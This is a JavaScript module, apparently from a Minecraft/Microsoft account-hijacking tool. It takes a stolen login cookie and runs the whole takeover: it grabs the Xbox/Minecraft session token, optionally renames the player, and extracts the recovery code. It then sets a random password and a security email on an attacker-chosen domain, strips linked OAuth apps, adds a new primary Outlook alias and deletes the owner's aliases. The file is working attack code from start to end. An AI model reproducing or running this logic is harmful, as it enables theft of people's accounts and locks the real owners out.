const generate = require("./generate")
const { domains } = require("../../config.json")
const addAlias = require("./secure/addAlias")
const getAMRP = require("./secure/getAMRP")
const getCookies = require("./secure/getCookies")
const getAliases = require("./secure/getAliases")
const getssid = require("./secure/getssid")
const makePrimary = require("./secure/makePrimary")
const recoveryCode = require("./secure/recoveryCode")
const removeAlias = require("./secure/removeAlias")
const removeExploit = require("./secure/removeExploit")
const securityInformation = require("./secure/securityInformation")
const getT = require("./secure/getT")
const polishHost = require("./secure/polishHost")
const changeIgn = require("./secure/changeIgn")
const getProfile = require("./secure/getProfile")
const getxbl = require("./secure/getxbl")
const recoveryCodeSecure = require("./recoveryCodeSecure")
const removeAuthApps = require("./secure/removeAuthApps")

module.exports = async (host, settings) => {
  let start = Date.now()
  let acc = {
    oldName: `Couldn't find!`,
    newName: `Couldn't change!`,
    oldEmail: `Couldn't find`,
    email: `Couldn't change!`,
    secEmail: `Couldn't change!`,
    password: `Couldn't change!`,
    recoveryCode: `Couldn't change!`,
    loginCookie: `Couldn't find!`,
    status: `unknown`,
    timeTaken: 0,
    ssid: `Couldn't Get!`
  }
  const [canary, apiCanary, amsc] = await getCookies()
  console.log(`[*] Got Cookies! and now trying to polish the Login Cookie`)
  host = await polishHost(host, amsc)
  if (host == "locked") {
    console.log(`Account is locked!`)
    acc.email = `Locked!`
    acc.secEmail = `Locked!`
    acc.recoveryCode = `Locked!`
    acc.password = `Locked!`
  }

  else if (host == "down") {
    console.log(`Microsoft services are down!`)
    acc.email = `Microsoft services are down!`
    acc.secEmail = `Microsoft services are down!`
    acc.recoveryCode = `Microsoft services are down!`
    acc.password = `Microsoft services are down!`
  } else {
    // Check Minecraft
    console.log(`Checking Minecraft account`)
    let xbl = await getxbl(host)
    if (xbl) {
      console.log(`Got XBL`)
      let ssid = await getssid(xbl)
      if (ssid) {
        console.log(`Got SSID`)
        acc.ssid = ssid
        let profile = await getProfile(ssid)
        if (profile) {
          acc.oldName = profile.name
          if (settings.change_ign) {
            let newName = profile.name
            if (newName.length < 16) {
              newName += "_"
            } else {
              newName = newName.replace(/.$/, ".")
            }
            changeIgn(ssid, newName).then(status => {
              if (status == 200) {
                acc.newName = newName
              } else {
                acc.newName = profile.name
              }
            })
          }
        } else {
          console.log(`[X] Couldn't get profile!`)
        }
      } else {
        console.log(`[X] Couldn't get SSID`)
      }
    } else {
      acc.oldName = `No Xbox Profile!`
      console.log(`[X] Couldn't get XBL`)
    }


    if ((acc.oldName == `Couldn't find!` || acc.oldName == `No Xbox Profile!`) && settings.secureifnomc == "0") {
      console.log(`Has NO MC and the settings says don't secure if no mc!`)
      acc.email = `No Minecraft!`
      acc.secEmail = `No Minecraft!`
      acc.recoveryCode = `No Minecraft!`
      acc.password = `No Minecraft!`
    }

    else {
      let email = null;

      let t = await getT(host, amsc)
      if (t == "locked") {
        console.log(`Account is locked!`)
        acc.email = `Locked!`
        acc.secEmail = `Locked!`
        acc.recoveryCode = `Locked!`
        acc.password = `Locked!`
      }

      else if (t == "down") {
        console.log(`Microsoft services are down!`)
        acc.email = `Microsoft services are down!`
        acc.secEmail = `Microsoft services are down!`
        acc.recoveryCode = `Microsoft services are down!`
        acc.password = `Microsoft services are down!`
      }
      else if (t) {
        console.log(`Found T`)
        let amrp = await getAMRP(t, amsc)
        if (amrp) {
          if (settings.oauthapps) {
            removeAuthApps(amrp, canary)
          }
          const securityParameters = await securityInformation(amrp)
          console.log(`Got Security Parameters`)
          email = securityParameters.email
          acc.oldEmail = email
          let data = securityParameters?.WLXAccount?.manageProofs
          let recovery = await recoveryCode(amrp, apiCanary, amsc, data?.encryptedNetId)
          console.log(`Recovery Code: ${recovery}`)
          if (recovery) {
            acc.recoveryCode = recovery
            let secEmail = `${generate(16)}@${settings?.domain ? settings.domain : domains[0]}`
            let password = generate(16)
            try {
              let newData = await recoveryCodeSecure(email, recovery, secEmail, password)
              if (newData) {
                acc.password = newData.password
                acc.secEmail = newData.secEmail
                acc.recoveryCode = newData.recoveryCode
              }
            } catch (e) {
              console.log(`Error while changing email data! (Retrying)`)
              let newData = await recoveryCodeSecure(email, recovery, secEmail, password)
              if (newData) {
                acc.password = newData.password
                acc.secEmail = newData.secEmail
                acc.recoveryCode = newData.recoveryCode
              }
            }
          } else {
            console.log(`[X] Failed to get the Recovery Code!`)
            acc.recoveryCode = `Failed to get the recovery code!`
          }

          let suc = await removeExploit(amrp, apiCanary, amsc)
          if (!suc) {
            console.log(`[X] Failed to Remove the Exploit!`)
          }
          let d = await getAliases(amrp)
          let [aliases, canary2] = d
          console.log(`[*] Aliases for this account: ${aliases.join(" | ")}`)
          let primaryAlias = generate(16)
          let isAdded = await addAlias(primaryAlias, canary2, amrp, amsc)
          if (isAdded) {
            console.log(`[✔] Added alias ${primaryAlias}@outlook.com to the Account!`)
            acc.email = aliases[0]
            email = primaryAlias + "@outlook.com"
            let isPrimary = await makePrimary(amrp, amsc, apiCanary, email)
            if (isPrimary) {
              acc.email = email
              console.log(`[✔] Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`)
              for (let alias of aliases) {
                if (alias == aliases[0]) continue
                if (alias.includes(primaryAlias)) continue
                await removeAlias(amrp, amsc, canary2, alias)
              }
            } else {
              console.log(`[X] Failed to Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`)
            }
          } else {
            console.log(`[X] Failed to add ${primaryAlias}@outlook.com as an Alias for the Account!`)
            acc.email = aliases[0]
            email = aliases[0]
          }
        } else {
          console.log(`[X] Couldn't find the AMRP`)
        }
      } else {

        acc.email = `Invalid Login Cookie!`
        acc.secEmail = `Invalid Login Cookie!`
        acc.recoveryCode = `Invalid Login Cookie!`
        acc.password = `Invalid Login Cookie!`
      }
    }
    acc.timeTaken = ((Date.now() - start) / 1000).toFixed(1)
    console.log(acc)
    return acc
  }

}